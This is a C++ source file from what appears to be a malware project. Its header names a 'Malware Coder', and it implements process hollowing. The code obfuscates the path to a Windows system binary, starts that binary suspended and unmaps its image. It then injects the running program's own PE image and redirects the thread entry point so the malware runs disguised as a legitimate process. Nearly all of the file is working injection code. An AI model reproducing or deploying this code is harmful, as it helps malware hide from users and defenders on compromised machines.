/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "ProcessHollowing.h"

ProcessHollowing::ProcessHollowing()
{
    this->targetPath = Tools::decode("sWSys\\owndWi:\\eCexp.el\\h64OW"); // decode -> C:\\Windows\\SysWOW64\\help.exe

    if (Tools::FileExists(targetPath))
    {

        char* lpMemory;
        char pPath[MAX_PATH];
        GetModuleFileNameA(NULL, pPath, MAX_PATH);

        HANDLE hFile = CreateFileA(pPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            return;

        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE)
            return;

        lpMemory = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
        if (lpMemory == NULL)
            return;

        DWORD dwBytesRead = 0;
        if (ReadFile(hFile, lpMemory, fileSize, &dwBytesRead, NULL) == FALSE)
            return;

        CloseHandle(hFile);

        if (this->StartPH(lpMemory)) // Start Process Hollowing
            exit(1);
    }
}

BOOL ProcessHollowing::StartPH(char* pImage)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[20];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFOA peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    char* pPath;

    pPath = (char*)this->targetPath.c_str();

    char* lfMemory = 0;

    HANDLE hFile = CreateFileA(pPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
        return FALSE;

    DWORD dwBytesRead = 0;

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, fileSize * 2);
    if (hHeap != NULL)
        lfMemory = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fileSize);

    if (ReadFile(hFile, lfMemory, fileSize, &dwBytesRead, NULL) == FALSE)
        return FALSE;

    CloseHandle(hFile);

    memcpy(&IDH, lfMemory, sizeof(IDH));
    memcpy(&INH, (void*)((DWORD)lfMemory + IDH.e_lfanew), sizeof(INH));

    HeapFree(hHeap, HEAP_NO_SERIALIZE, lfMemory);

    // Just Grabbing Its ImageBase and SizeOfImage , Thats all we needed from the local process..
    DWORD localImageBase = INH.OptionalHeader.ImageBase;
    DWORD localImageSize = INH.OptionalHeader.SizeOfImage;

    memcpy(&IDH, pImage, sizeof(IDH));
    memcpy(&INH, (void*)((DWORD)pImage + IDH.e_lfanew), sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwImageSize);
    memset(pMemory, 0, dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections, (char*)(firstSection), sizeof(IMAGE_SECTION_HEADER) * INH.FileHeader.NumberOfSections);

    memcpy(pFile, pImage, dwHeader);

    if ((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment) == 0)
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for (dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile, (char*)(pImage + Sections[dwSectionCount].PointerToRawData), dwSectionSize);

        // std::cout << "Section Name: " << (char*)Sections[dwSectionCount].Name << "\n");

        if ((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment) == 0)
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }

    memset(&peStartUpInformation, 0, sizeof(STARTUPINFOA));
    memset(&peProcessInformation, 0, sizeof(PROCESS_INFORMATION));
    memset(&pContext, 0, sizeof(CONTEXT));

    Sleep(500);
    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if (CreateProcessA(NULL, pPath, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &peStartUpInformation, &peProcessInformation))
    {
        pContext.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(peProcessInformation.hThread, &pContext) == NULL)
        {
            TerminateProcess(peProcessInformation.hProcess, NULL);
            return FALSE;
        }

        Sleep(500);

        if (INH.OptionalHeader.ImageBase == localImageBase && INH.OptionalHeader.SizeOfImage <= localImageSize)
        {
            if (VirtualProtectEx(peProcessInformation.hProcess, (LPVOID)(INH.OptionalHeader.ImageBase), dwImageSize, PAGE_EXECUTE_READWRITE, &previousProtection) == 0)
            {
                TerminateProcess(peProcessInformation.hProcess, NULL);
                return FALSE;
            }
        }
        else
        {
            NtUnmapViewOfSection(peProcessInformation.hProcess, (PVOID)(localImageBase));
            if (VirtualAllocEx(peProcessInformation.hProcess, (LPVOID)(INH.OptionalHeader.ImageBase), dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == NULL)
            {
                TerminateProcess(peProcessInformation.hProcess, NULL);
                return FALSE;
            }
        }

        Sleep(500);

        if (WriteProcessMemory(peProcessInformation.hProcess, (void*)(INH.OptionalHeader.ImageBase), pMemory, dwImageSize, &dwWritten) == 0)
        {
            TerminateProcess(peProcessInformation.hProcess, NULL);
            return FALSE;
        }

        Sleep(500);

        if (WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Ebx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten) == 0)
        {
            TerminateProcess(peProcessInformation.hProcess, NULL);
            return FALSE;
        }

        Sleep(500);

        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        if (SetThreadContext(peProcessInformation.hThread, &pContext) == NULL)
        {
            TerminateProcess(peProcessInformation.hProcess, NULL);
            return FALSE;
        }

        Sleep(500);

        VirtualProtectEx(peProcessInformation.hProcess, (LPVOID)(INH.OptionalHeader.ImageBase), dwImageSize, previousProtection, NULL);

        Sleep(500);

        DWORD error = -1;

        ResumeThread(peProcessInformation.hThread);

        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pMemory);

        return TRUE;
    }

    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pMemory);
    return FALSE;
}